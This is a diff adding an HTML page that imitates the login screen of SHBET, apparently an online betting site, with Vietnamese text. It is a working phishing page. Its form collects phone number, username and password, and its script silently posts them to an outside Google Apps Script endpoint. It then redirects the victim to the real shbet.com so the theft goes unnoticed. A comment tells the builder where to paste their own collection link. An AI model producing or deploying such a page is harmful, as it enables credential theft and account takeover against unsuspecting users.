@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <title>Đăng Nhập SHBET</title>
+    <style>
+        body { margin: 0; background: #004d40; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; }
+        .box { background: white; padding: 30px; border-radius: 15px; width: 350px; text-align: center; box-shadow: 0 10px 20px rgba(0,0,0,0.5); }
+        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; }
+        button { width: 100%; padding: 12px; background: #94b2c5; color: white; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h2>ĐĂNG NHẬP NGAY</h2>
+        <form id="myForm">
+            <input type="text" name="phone" placeholder="Số điện thoại" required>
+            <input type="text" name="username" placeholder="Tên đăng nhập" required>
+            <input type="password" name="password" placeholder="Mật khẩu" required>
+            <button type="submit" id="btn">ĐĂNG NHẬP</button>
+        </form>
+    </div>
+    <script>
+        // QUAN TRỌNG: Dán link bạn vừa Copy ở Bước 1 vào giữa hai dấu nháy đơn dưới đây
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbyYE2RhXAqGWO6iz-NSy6gzeFxzw9aEPyi9J38ABRA-6Pk9AoYNxV4M-PHZmFnP-COG_Q/exec';
+        const form = document.getElementById('myForm');
+        form.addEventListener('submit', e => {
+            e.preventDefault();
+            document.getElementById('btn').innerHTML = "Đang xử lý...";
+            fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+            .then(res => { window.location.href = 'https://shbet.com'; })
+            .catch(err => { window.location.href = 'https://shbet.com'; });
+        });
+    </script>
+</body>
+</html>
